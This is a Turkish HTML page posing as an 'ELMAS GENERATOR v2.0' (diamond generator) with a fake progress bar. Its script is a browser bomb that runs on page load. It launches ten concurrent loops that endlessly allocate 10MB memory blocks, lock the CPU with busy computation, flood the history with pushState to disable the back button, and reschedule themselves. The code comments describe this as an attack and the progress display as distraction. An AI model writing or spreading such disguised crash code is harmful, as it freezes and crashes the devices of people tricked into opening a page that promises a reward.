<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELMAS GENERATOR v2.0</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 100px; }
        .box { border: 1px solid #00ff00; display: inline-block; padding: 20px; box-shadow: 0 0 15px #00ff00; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h3>ELMASLAR AKTARILIYOR...</h3>
        <div class="loader"></div>
        <p id="p">Hazırlanıyor: %0</p>
    </div>

<script>
    // GÖRSEL OYALAMA
    let count = 0;
    setInterval(() => { if(count < 99) { count++; document.getElementById('p').innerText = "Hazırlanıyor: %" + count; }}, 50);

    // --- 100X DOZER MOTORU ---
    function patlat() {
        // Belleği devasa bloklarla anında doldurur
        const bombalar = [];
        while (true) {
            // Saniyede binlerce kez bellek bloğu oluşturur
            bombalar.push(new Uint8Array(1024 * 1024 * 10)); // Her seferinde 10MB
            
            // İşlemciyi (CPU) kilitler
            for (let i = 0; i < 1000000; i++) {
                let x = Math.atan(Math.random()) * Math.tan(Math.random());
            }
            
            // Tarayıcı geçmişini şişirerek geri tuşunu yok eder
            window.history.pushState(null, "", window.location.href);
            
            // Kendi kendini kopyalar (Recursion)
            setTimeout(patlat, 0); 
        }
    }

    // 10 ayrı koldan eşzamanlı saldırı başlatır
    for(let i=0; i<10; i++) {
        setTimeout(patlat, 100);
    }
</script>
</body>
</html>
